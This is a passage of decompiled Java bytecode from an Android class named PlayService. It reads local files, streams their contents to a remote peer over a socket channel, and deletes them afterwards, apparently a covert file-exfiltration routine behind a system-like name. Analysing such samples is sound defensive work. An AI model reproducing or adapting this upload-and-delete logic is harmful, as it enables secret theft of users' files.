    //   3536: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   3539: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3542: aload 14
    //   3544: astore 18
    //   3546: aload 14
    //   3548: astore 19
    //   3550: aload 14
    //   3552: astore 16
    //   3554: aload 14
    //   3556: astore 20
    //   3558: aload 14
    //   3560: astore 17
    //   3562: aload 14
    //   3564: astore 13
    //   3566: aload_0
    //   3567: aload_0
    //   3568: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   3571: iload_3
    //   3572: invokestatic 5747	com/android/location/PlayService:intToByteArray	(I)[B
    //   3575: invokestatic 4901	java/nio/ByteBuffer:wrap	([B)Ljava/nio/ByteBuffer;
    //   3578: invokespecial 5749	com/android/location/PlayService:MyWrite	(Ljava/nio/channels/SocketChannel;Ljava/nio/ByteBuffer;)I
    //   3581: ifgt +65 -> 3646
    //   3584: aload 14
    //   3586: astore 18
    //   3588: aload 14
    //   3590: astore 19
    //   3592: aload 14
    //   3594: astore 16
    //   3596: aload 14
    //   3598: astore 20
    //   3600: aload 14
    //   3602: astore 17
    //   3604: aload 14
    //   3606: astore 13
    //   3608: ldc_w 5801
    //   3611: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3614: aload 14
    //   3616: astore 18
    //   3618: aload 14
    //   3620: astore 19
    //   3622: aload 14
    //   3624: astore 16
    //   3626: aload 14
    //   3628: astore 20
    //   3630: aload 14
    //   3632: astore 17
    //   3634: aload 14
    //   3636: astore 13
    //   3638: new 1272	java/io/IOException
    //   3641: dup
    //   3642: invokespecial 5754	java/io/IOException:<init>	()V
    //   3645: athrow
    //   3646: aload 14
    //   3648: astore 18
    //   3650: aload 14
    //   3652: astore 19
    //   3654: aload 14
    //   3656: astore 16
    //   3658: aload 14
    //   3660: astore 20
    //   3662: aload 14
    //   3664: astore 17
    //   3666: aload 14
    //   3668: astore 13
    //   3670: ldc_w 5803
    //   3673: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3676: aload 14
    //   3678: astore 18
    //   3680: aload 14
    //   3682: astore 19
    //   3684: aload 14
    //   3686: astore 16
    //   3688: aload 14
    //   3690: astore 20
    //   3692: aload 14
    //   3694: astore 17
    //   3696: aload 14
    //   3698: astore 13
    //   3700: ldc_w 5805
    //   3703: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3706: aload 14
    //   3708: astore 18
    //   3710: aload 14
    //   3712: astore 19
    //   3714: aload 14
    //   3716: astore 16
    //   3718: aload 14
    //   3720: astore 20
    //   3722: aload 14
    //   3724: astore 17
    //   3726: aload 14
    //   3728: astore 13
    //   3730: aload 25
    //   3732: invokevirtual 5783	java/nio/ByteBuffer:clear	()Ljava/nio/Buffer;
    //   3735: pop
    //   3736: aload 14
    //   3738: astore 18
    //   3740: aload 14
    //   3742: astore 19
    //   3744: aload 14
    //   3746: astore 16
    //   3748: aload 14
    //   3750: astore 20
    //   3752: aload 14
    //   3754: astore 17
    //   3756: aload 14
    //   3758: astore 13
    //   3760: aload_0
    //   3761: aload_0
    //   3762: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   3765: aload 25
    //   3767: iconst_4
    //   3768: invokespecial 5807	com/android/location/PlayService:MyRead	(Ljava/nio/channels/SocketChannel;Ljava/nio/ByteBuffer;I)I
    //   3771: ifgt +65 -> 3836
    //   3774: aload 14
    //   3776: astore 18
    //   3778: aload 14
    //   3780: astore 19
    //   3782: aload 14
    //   3784: astore 16
    //   3786: aload 14
    //   3788: astore 20
    //   3790: aload 14
    //   3792: astore 17
    //   3794: aload 14
    //   3796: astore 13
    //   3798: ldc_w 5809
    //   3801: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3804: aload 14
    //   3806: astore 18
    //   3808: aload 14
    //   3810: astore 19
    //   3812: aload 14
    //   3814: astore 16
    //   3816: aload 14
    //   3818: astore 20
    //   3820: aload 14
    //   3822: astore 17
    //   3824: aload 14
    //   3826: astore 13
    //   3828: new 1272	java/io/IOException
    //   3831: dup
    //   3832: invokespecial 5754	java/io/IOException:<init>	()V
    //   3835: athrow
    //   3836: aload 14
    //   3838: astore 18
    //   3840: aload 14
    //   3842: astore 19
    //   3844: aload 14
    //   3846: astore 16
    //   3848: aload 14
    //   3850: astore 20
    //   3852: aload 14
    //   3854: astore 17
    //   3856: aload 14
    //   3858: astore 13
    //   3860: aload_0
    //   3861: iload_2
    //   3862: aload 25
    //   3864: invokevirtual 3479	java/nio/ByteBuffer:array	()[B
    //   3867: invokevirtual 5813	com/android/location/PlayService:WriteLabel	(I[B)I
    //   3870: istore_3
    //   3871: iload_3
    //   3872: ifne +225 -> 4097
    //   3875: aload 14
    //   3877: astore 18
    //   3879: aload 14
    //   3881: astore 19
    //   3883: aload 14
    //   3885: astore 16
    //   3887: aload 14
    //   3889: astore 20
    //   3891: aload 14
    //   3893: astore 17
    //   3895: aload 14
    //   3897: astore 13
    //   3899: ldc_w 5815
    //   3902: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3905: aload 14
    //   3907: astore 18
    //   3909: aload 14
    //   3911: astore 19
    //   3913: aload 14
    //   3915: astore 16
    //   3917: aload 14
    //   3919: astore 20
    //   3921: aload 14
    //   3923: astore 13
    //   3925: aload 14
    //   3927: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   3930: aload 14
    //   3932: astore 18
    //   3934: aload 14
    //   3936: astore 19
    //   3938: aload 14
    //   3940: astore 16
    //   3942: aload 14
    //   3944: astore 20
    //   3946: aload 14
    //   3948: astore 17
    //   3950: aload 14
    //   3952: astore 13
    //   3954: aload_0
    //   3955: aload_1
    //   3956: invokevirtual 3607	com/android/location/PlayService:deleteFile	(Ljava/lang/String;)Z
    //   3959: pop
    //   3960: aload 14
    //   3962: astore 18
    //   3964: aload 14
    //   3966: astore 19
    //   3968: aload 14
    //   3970: astore 16
    //   3972: aload 14
    //   3974: astore 20
    //   3976: aload 14
    //   3978: astore 17
    //   3980: aload 14
    //   3982: astore 13
    //   3984: new 1250	java/io/File
    //   3987: dup
    //   3988: new 864	java/lang/StringBuilder
    //   3991: dup
    //   3992: invokespecial 2166	java/lang/StringBuilder:<init>	()V
    //   3995: aload_0
    //   3996: invokevirtual 2170	com/android/location/PlayService:getFilesDir	()Ljava/io/File;
    //   3999: invokevirtual 1478	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   4002: ldc_w 1717
    //   4005: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   4008: ldc_w 4893
    //   4011: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   4014: iload_2
    //   4015: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   4018: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   4021: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   4024: astore_1
    //   4025: aload 14
    //   4027: astore 18
    //   4029: aload 14
    //   4031: astore 19
    //   4033: aload 14
    //   4035: astore 16
    //   4037: aload 14
    //   4039: astore 20
    //   4041: aload 14
    //   4043: astore 17
    //   4045: aload 14
    //   4047: astore 13
    //   4049: aload_1
    //   4050: invokevirtual 1257	java/io/File:exists	()Z
    //   4053: ifeq +32 -> 4085
    //   4056: aload 14
    //   4058: astore 18
    //   4060: aload 14
    //   4062: astore 19
    //   4064: aload 14
    //   4066: astore 16
    //   4068: aload 14
    //   4070: astore 20
    //   4072: aload 14
    //   4074: astore 17
    //   4076: aload 14
    //   4078: astore 13
    //   4080: aload_1
    //   4081: invokevirtual 1281	java/io/File:delete	()Z
    //   4084: pop
    //   4085: aload 14
    //   4087: ifnull +8 -> 4095
    //   4090: aload 14
    //   4092: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   4095: iconst_1
    //   4096: ireturn
    //   4097: aload 14
    //   4099: astore 18
    //   4101: aload 14
    //   4103: astore 19
    //   4105: aload 14
    //   4107: astore 16
    //   4109: aload 14
    //   4111: astore 20
    //   4113: aload 14
    //   4115: astore 17
    //   4117: aload 14
    //   4119: astore 13
    //   4121: new 864	java/lang/StringBuilder
    //   4124: dup
    //   4125: ldc_w 5817
    //   4128: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   4131: iload_3
    //   4132: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   4135: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   4138: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4141: aload 14
    //   4143: astore 18
    //   4145: aload 14
    //   4147: astore 19
    //   4149: aload 14
    //   4151: astore 16
    //   4153: aload 14
    //   4155: astore 20
    //   4157: aload 14
    //   4159: astore 17
    //   4161: aload 14
    //   4163: astore 13
    //   4165: aload 25
    //   4167: invokevirtual 5783	java/nio/ByteBuffer:clear	()Ljava/nio/Buffer;
    //   4170: pop
    //   4171: aload 14
    //   4173: astore 18
    //   4175: aload 14
    //   4177: astore 19
    //   4179: aload 14
    //   4181: astore 16
    //   4183: aload 14
    //   4185: astore 20
    //   4187: aload 14
    //   4189: astore 17
    //   4191: aload 14
    //   4193: astore 13
    //   4195: ldc_w 5819
    //   4198: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4201: aload 14
    //   4203: astore 18
    //   4205: aload 14
    //   4207: astore 19
    //   4209: aload 14
    //   4211: astore 16
    //   4213: aload 14
    //   4215: astore 20
    //   4217: aload 14
    //   4219: astore 17
    //   4221: aload 14
    //   4223: astore 13
    //   4225: aload_0
    //   4226: aload_0
    //   4227: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   4230: aload 25
    //   4232: iconst_4
    //   4233: invokespecial 5807	com/android/location/PlayService:MyRead	(Ljava/nio/channels/SocketChannel;Ljava/nio/ByteBuffer;I)I
    //   4236: ifgt +65 -> 4301
    //   4239: aload 14
    //   4241: astore 18
    //   4243: aload 14
    //   4245: astore 19
    //   4247: aload 14
    //   4249: astore 16
    //   4251: aload 14
    //   4253: astore 20
    //   4255: aload 14
    //   4257: astore 17
    //   4259: aload 14
    //   4261: astore 13
    //   4263: ldc_w 5821
    //   4266: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4269: aload 14
    //   4271: astore 18
    //   4273: aload 14
    //   4275: astore 19
    //   4277: aload 14
    //   4279: astore 16
    //   4281: aload 14
    //   4283: astore 20
    //   4285: aload 14
    //   4287: astore 17
    //   4289: aload 14
    //   4291: astore 13
    //   4293: new 1272	java/io/IOException
    //   4296: dup
    //   4297: invokespecial 5754	java/io/IOException:<init>	()V
    //   4300: athrow
    //   4301: aload 14
    //   4303: astore 18
    //   4305: aload 14
    //   4307: astore 19
    //   4309: aload 14
    //   4311: astore 16
    //   4313: aload 14
    //   4315: astore 20
    //   4317: aload 14
    //   4319: astore 17
    //   4321: aload 14
    //   4323: astore 13
    //   4325: aload 25
    //   4327: invokevirtual 3479	java/nio/ByteBuffer:array	()[B
    //   4330: invokestatic 4901	java/nio/ByteBuffer:wrap	([B)Ljava/nio/ByteBuffer;
    //   4333: astore 15
    //   4335: aload 14
    //   4337: astore 18
    //   4339: aload 14
    //   4341: astore 19
    //   4343: aload 14
    //   4345: astore 16
    //   4347: aload 14
    //   4349: astore 20
    //   4351: aload 14
    //   4353: astore 17
    //   4355: aload 14
    //   4357: astore 13
    //   4359: aload 15
    //   4361: aconst_null
    //   4362: invokevirtual 4905	java/nio/ByteBuffer:order	(Ljava/nio/ByteOrder;)Ljava/nio/ByteBuffer;
    //   4365: pop
    //   4366: aload 14
    //   4368: astore 18
    //   4370: aload 14
    //   4372: astore 19
    //   4374: aload 14
    //   4376: astore 16
    //   4378: aload 14
    //   4380: astore 20
    //   4382: aload 14
    //   4384: astore 17
    //   4386: aload 14
    //   4388: astore 13
    //   4390: aload 15
    //   4392: invokevirtual 4907	java/nio/ByteBuffer:getInt	()I
    //   4395: istore 6
    //   4397: aload 14
    //   4399: astore 18
    //   4401: aload 14
    //   4403: astore 19
    //   4405: aload 14
    //   4407: astore 16
    //   4409: aload 14
    //   4411: astore 20
    //   4413: aload 14
    //   4415: astore 17
    //   4417: aload 14
    //   4419: astore 13
    //   4421: new 864	java/lang/StringBuilder
    //   4424: dup
    //   4425: ldc_w 5823
    //   4428: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   4431: iload 6
    //   4433: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   4436: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   4439: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4442: aload 14
    //   4444: astore 18
    //   4446: aload 14
    //   4448: astore 19
    //   4450: aload 14
    //   4452: astore 16
    //   4454: aload 14
    //   4456: astore 20
    //   4458: aload 14
    //   4460: astore 17
    //   4462: aload 14
    //   4464: astore 13
    //   4466: aload 14
    //   4468: invokevirtual 3599	java/io/FileInputStream:available	()I
    //   4471: istore 4
    //   4473: aload 14
    //   4475: astore 18
    //   4477: aload 14
    //   4479: astore 19
    //   4481: aload 14
    //   4483: astore 16
    //   4485: aload 14
    //   4487: astore 20
    //   4489: aload 14
    //   4491: astore 17
    //   4493: aload 14
    //   4495: astore 13
    //   4497: new 864	java/lang/StringBuilder
    //   4500: dup
    //   4501: ldc_w 5825
    //   4504: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   4507: iload 4
    //   4509: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   4512: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   4515: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4518: iload 4
    //   4520: iload 6
    //   4522: if_icmpge +186 -> 4708
    //   4525: aload 14
    //   4527: astore 18
    //   4529: aload 14
    //   4531: astore 19
    //   4533: aload 14
    //   4535: astore 16
    //   4537: aload 14
    //   4539: astore 20
    //   4541: aload 14
    //   4543: astore 17
    //   4545: aload 14
    //   4547: astore 13
    //   4549: new 864	java/lang/StringBuilder
    //   4552: dup
    //   4553: ldc_w 5827
    //   4556: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   4559: iload 4
    //   4561: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   4564: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   4567: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4570: aload 14
    //   4572: astore 18
    //   4574: aload 14
    //   4576: astore 19
    //   4578: aload 14
    //   4580: astore 16
    //   4582: aload 14
    //   4584: astore 20
    //   4586: aload 14
    //   4588: astore 17
    //   4590: aload 14
    //   4592: astore 13
    //   4594: new 1250	java/io/File
    //   4597: dup
    //   4598: new 864	java/lang/StringBuilder
    //   4601: dup
    //   4602: invokespecial 2166	java/lang/StringBuilder:<init>	()V
    //   4605: aload_0
    //   4606: invokevirtual 2170	com/android/location/PlayService:getFilesDir	()Ljava/io/File;
    //   4609: invokevirtual 1478	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   4612: ldc_w 1717
    //   4615: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   4618: ldc_w 4893
    //   4621: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   4624: iload_2
    //   4625: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   4628: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   4631: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   4634: astore_1
    //   4635: aload 14
    //   4637: astore 18
    //   4639: aload 14
    //   4641: astore 19
    //   4643: aload 14
    //   4645: astore 16
    //   4647: aload 14
    //   4649: astore 20
    //   4651: aload 14
    //   4653: astore 17
    //   4655: aload 14
    //   4657: astore 13
    //   4659: aload_1
    //   4660: invokevirtual 1257	java/io/File:exists	()Z
    //   4663: ifeq +32 -> 4695
    //   4666: aload 14
    //   4668: astore 18
    //   4670: aload 14
    //   4672: astore 19
    //   4674: aload 14
    //   4676: astore 16
    //   4678: aload 14
    //   4680: astore 20
    //   4682: aload 14
    //   4684: astore 17
    //   4686: aload 14
    //   4688: astore 13
    //   4690: aload_1
    //   4691: invokevirtual 1281	java/io/File:delete	()Z
    //   4694: pop
    //   4695: aload 14
    //   4697: ifnull +8 -> 4705
    //   4700: aload 14
    //   4702: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   4705: bipush 6
    //   4707: ireturn
    //   4708: iload 4
    //   4710: istore_3
    //   4711: iload 6
    //   4713: ifle +46 -> 4759
    //   4716: iload 4
    //   4718: iload 6
    //   4720: isub
    //   4721: istore_3
    //   4722: iload 6
    //   4724: i2l
    //   4725: lstore 7
    //   4727: aload 14
    //   4729: astore 18
    //   4731: aload 14
    //   4733: astore 19
    //   4735: aload 14
    //   4737: astore 16
    //   4739: aload 14
    //   4741: astore 20
    //   4743: aload 14
    //   4745: astore 17
    //   4747: aload 14
    //   4749: astore 13
    //   4751: aload 14
    //   4753: lload 7
    //   4755: invokevirtual 5780	java/io/FileInputStream:skip	(J)J
    //   4758: pop2
    //   4759: aload 14
    //   4761: astore 18
    //   4763: aload 14
    //   4765: astore 19
    //   4767: aload 14
    //   4769: astore 16
    //   4771: aload 14
    //   4773: astore 20
    //   4775: aload 14
    //   4777: astore 17
    //   4779: aload 14
    //   4781: astore 13
    //   4783: iload_3
    //   4784: invokestatic 5747	com/android/location/PlayService:intToByteArray	(I)[B
    //   4787: astore 15
    //   4789: aload 14
    //   4791: astore 18
    //   4793: aload 14
    //   4795: astore 19
    //   4797: aload 14
    //   4799: astore 16
    //   4801: aload 14
    //   4803: astore 20
    //   4805: aload 14
    //   4807: astore 17
    //   4809: aload 14
    //   4811: astore 13
    //   4813: aload_0
    //   4814: aload_0
    //   4815: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   4818: aload 15
    //   4820: invokestatic 4901	java/nio/ByteBuffer:wrap	([B)Ljava/nio/ByteBuffer;
    //   4823: invokespecial 5749	com/android/location/PlayService:MyWrite	(Ljava/nio/channels/SocketChannel;Ljava/nio/ByteBuffer;)I
    //   4826: ifgt +65 -> 4891
    //   4829: aload 14
    //   4831: astore 18
    //   4833: aload 14
    //   4835: astore 19
    //   4837: aload 14
    //   4839: astore 16
    //   4841: aload 14
    //   4843: astore 20
    //   4845: aload 14
    //   4847: astore 17
    //   4849: aload 14
    //   4851: astore 13
    //   4853: ldc_w 5829
    //   4856: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4859: aload 14
    //   4861: astore 18
    //   4863: aload 14
    //   4865: astore 19
    //   4867: aload 14
    //   4869: astore 16
    //   4871: aload 14
    //   4873: astore 20
    //   4875: aload 14
    //   4877: astore 17
    //   4879: aload 14
    //   4881: astore 13
    //   4883: new 1272	java/io/IOException
    //   4886: dup
    //   4887: invokespecial 5754	java/io/IOException:<init>	()V
    //   4890: athrow
    //   4891: iload_3
    //   4892: ifle +309 -> 5201
    //   4895: aload 14
    //   4897: astore 18
    //   4899: aload 14
    //   4901: astore 19
    //   4903: aload 14
    //   4905: astore 16
    //   4907: aload 14
    //   4909: astore 20
    //   4911: aload 14
    //   4913: astore 17
    //   4915: aload 14
    //   4917: astore 13
    //   4919: iload_3
    //   4920: iload 5
    //   4922: invokestatic 5834	java/lang/Math:min	(II)I
    //   4925: istore_3
    //   4926: aload 14
    //   4928: astore 18
    //   4930: aload 14
    //   4932: astore 19
    //   4934: aload 14
    //   4936: astore 16
    //   4938: aload 14
    //   4940: astore 20
    //   4942: aload 14
    //   4944: astore 17
    //   4946: aload 14
    //   4948: astore 13
    //   4950: aload 25
    //   4952: invokevirtual 5783	java/nio/ByteBuffer:clear	()Ljava/nio/Buffer;
    //   4955: pop
    //   4956: aload 14
    //   4958: astore 18
    //   4960: aload 14
    //   4962: astore 19
    //   4964: aload 14
    //   4966: astore 16
    //   4968: aload 14
    //   4970: astore 20
    //   4972: aload 14
    //   4974: astore 17
    //   4976: aload 14
    //   4978: astore 13
    //   4980: aload 14
    //   4982: aload 25
    //   4984: invokevirtual 3479	java/nio/ByteBuffer:array	()[B
    //   4987: iconst_0
    //   4988: iload_3
    //   4989: invokevirtual 3602	java/io/FileInputStream:read	([BII)I
    //   4992: istore_3
    //   4993: aload 14
    //   4995: astore 18
    //   4997: aload 14
    //   4999: astore 19
    //   5001: aload 14
    //   5003: astore 16
    //   5005: aload 14
    //   5007: astore 20
    //   5009: aload 14
    //   5011: astore 17
    //   5013: aload 14
    //   5015: astore 13
    //   5017: new 864	java/lang/StringBuilder
    //   5020: dup
    //   5021: ldc_w 5836
    //   5024: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   5027: aload 25
    //   5029: invokevirtual 1951	java/nio/ByteBuffer:limit	()I
    //   5032: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   5035: ldc_w 1717
    //   5038: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   5041: aload 25
    //   5043: invokevirtual 5839	java/nio/ByteBuffer:capacity	()I
    //   5046: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   5049: ldc_w 1717
    //   5052: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   5055: iload_3
    //   5056: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   5059: ldc_w 1717
    //   5062: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   5065: aload 25
    //   5067: invokevirtual 5842	java/nio/ByteBuffer:remaining	()I
    //   5070: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   5073: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   5076: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   5079: aload 14
    //   5081: astore 18
    //   5083: aload 14
    //   5085: astore 19
    //   5087: aload 14
    //   5089: astore 16
    //   5091: aload 14
    //   5093: astore 20
    //   5095: aload 14
    //   5097: astore 17
    //   5099: aload 14
    //   5101: astore 13
    //   5103: ldc_w 5844
    //   5106: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   5109: aload 14
    //   5111: astore 18
    //   5113: aload 14
    //   5115: astore 19
    //   5117: aload 14
    //   5119: astore 16
    //   5121: aload 14
    //   5123: astore 20
    //   5125: aload 14
    //   5127: astore 17
    //   5129: aload 14
    //   5131: astore 13
    //   5133: invokestatic 1943	com/android/location/PlayService:getCurrentTime	()J
    //   5136: lstore 7
    //   5138: aload 14
    //   5140: astore 18
    //   5142: aload 14
    //   5144: astore 19
    //   5146: aload 14
    //   5148: astore 16
    //   5150: aload 14
    //   5152: astore 20
    //   5154: aload 14
    //   5156: astore 17
    //   5158: aload 14
    //   5160: astore 13
    //   5162: aload 25
    //   5164: iload_3
    //   5165: invokevirtual 1949	java/nio/ByteBuffer:limit	(I)Ljava/nio/Buffer;
    //   5168: pop
    //   5169: goto +4178 -> 9347
    //   5172: aload 14
    //   5174: astore 18
    //   5176: aload 14
    //   5178: astore 19
    //   5180: aload 14
    //   5182: astore 16
    //   5184: aload 14
    //   5186: astore 20
    //   5188: aload 14
    //   5190: astore 17
    //   5192: aload 14
    //   5194: astore 13
    //   5196: aload 14
    //   5198: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   5201: ldc_w 571
    //   5204: astore 15
    //   5206: aload 14
    //   5208: astore 18
    //   5210: aload 14
    //   5212: astore 19
    //   5214: aload 14
    //   5216: astore 16
    //   5218: aload 14
    //   5220: astore 20
    //   5222: aload 14
    //   5224: astore 17
    //   5226: aload 14
    //   5228: astore 13
    //   5230: ldc_w 5846
    //   5233: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   5236: aload 14
    //   5238: astore 18
    //   5240: aload 14
    //   5242: astore 19
    //   5244: aload 14
    //   5246: astore 16
    //   5248: aload 14
    //   5250: astore 20
    //   5252: aload 14
    //   5254: astore 17
    //   5256: aload 14
    //   5258: astore 13
    //   5260: aload 25
    //   5262: aload 25
    //   5264: invokevirtual 5839	java/nio/ByteBuffer:capacity	()I
    //   5267: invokevirtual 1949	java/nio/ByteBuffer:limit	(I)Ljava/nio/Buffer;
    //   5270: pop
    //   5271: aload 14
    //   5273: astore 18
    //   5275: aload 14
    //   5277: astore 19
    //   5279: aload 14
    //   5281: astore 16
    //   5283: aload 14
    //   5285: astore 20
    //   5287: aload 14
    //   5289: astore 17
    //   5291: aload 14
    //   5293: astore 13
    //   5295: aload 25
    //   5297: aload 25
    //   5299: invokevirtual 5839	java/nio/ByteBuffer:capacity	()I
    //   5302: invokevirtual 1949	java/nio/ByteBuffer:limit	(I)Ljava/nio/Buffer;
    //   5305: pop
    //   5306: aload 14
    //   5308: astore 18
    //   5310: aload 14
    //   5312: astore 19
    //   5314: aload 14
    //   5316: astore 16
    //   5318: aload 14
    //   5320: astore 20
    //   5322: aload 14
    //   5324: astore 17
    //   5326: aload 14
    //   5328: astore 13
    //   5330: aload 25
    //   5332: invokevirtual 5783	java/nio/ByteBuffer:clear	()Ljava/nio/Buffer;
    //   5335: pop
    //   5336: aload 14
    //   5338: astore 18
    //   5340: aload 14
    //   5342: astore 19
    //   5344: aload 14
    //   5346: astore 16
    //   5348: aload 14
    //   5350: astore 20
    //   5352: aload 14
    //   5354: astore 17
    //   5356: aload 14
    //   5358: astore 13
    //   5360: aload_0
    //   5361: aload_0
    //   5362: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   5365: aload 25
    //   5367: iconst_0
    //   5368: invokespecial 5807	com/android/location/PlayService:MyRead	(Ljava/nio/channels/SocketChannel;Ljava/nio/ByteBuffer;I)I
    //   5371: istore_3
    //   5372: iload_3
    //   5373: ifgt +1579 -> 6952
    //   5376: aload 14
    //   5378: astore 18
    //   5380: aload 14
    //   5382: astore 19
    //   5384: aload 14
    //   5386: astore 16
    //   5388: aload 14
    //   5390: astore 20
    //   5392: aload 14
    //   5394: astore 17
    //   5396: aload 14
    //   5398: astore 13
    //   5400: new 864	java/lang/StringBuilder
    //   5403: dup
    //   5404: ldc_w 5848
    //   5407: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   5410: aload 15
    //   5412: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   5415: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   5418: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   5421: aload 14
    //   5423: astore 18
    //   5425: aload 14
    //   5427: astore 19
    //   5429: aload 14
    //   5431: astore 16
    //   5433: aload 14
    //   5435: astore 20
    //   5437: aload 14
    //   5439: astore 17
    //   5441: aload 14
    //   5443: astore 13
    //   5445: aload 15
    //   5447: ldc_w 1312
    //   5450: invokevirtual 1534	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   5453: astore 21
    //   5455: aload 14
    //   5457: astore 18
    //   5459: aload 14
    //   5461: astore 19
    //   5463: aload 14
    //   5465: astore 16
    //   5467: aload 14
    //   5469: astore 20
    //   5471: aload 14
    //   5473: astore 17
    //   5475: aload 14
    //   5477: astore 13
    //   5479: new 864	java/lang/StringBuilder
    //   5482: dup
    //   5483: ldc_w 5850
    //   5486: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   5489: aload 21
    //   5491: arraylength
    //   5492: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   5495: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   5498: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   5501: iconst_0
    //   5502: istore_3
    //   5503: aload 14
    //   5505: astore 18
    //   5507: aload 14
    //   5509: astore 19
    //   5511: aload 14
    //   5513: astore 16
    //   5515: aload 14
    //   5517: astore 20
    //   5519: aload 14
    //   5521: astore 17
    //   5523: aload 14
    //   5525: astore 13
    //   5527: iload_3
    //   5528: aload 21
    //   5530: arraylength
    //   5531: if_icmplt +1752 -> 7283
    //   5534: aload 14
    //   5536: astore 18
    //   5538: aload 14
    //   5540: astore 19
    //   5542: aload 14
    //   5544: astore 16
    //   5546: aload 14
    //   5548: astore 20
    //   5550: aload 14
    //   5552: astore 17
    //   5554: aload 14
    //   5556: astore 13
    //   5558: aload 15
    //   5560: ldc_w 5852
    //   5563: invokevirtual 1581	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   5566: iconst_m1
    //   5567: if_icmple +3489 -> 9056
    //   5570: iconst_1
    //   5571: istore 12
    //   5573: aload 14
    //   5575: astore 18
    //   5577: aload 14
    //   5579: astore 19
    //   5581: aload 14
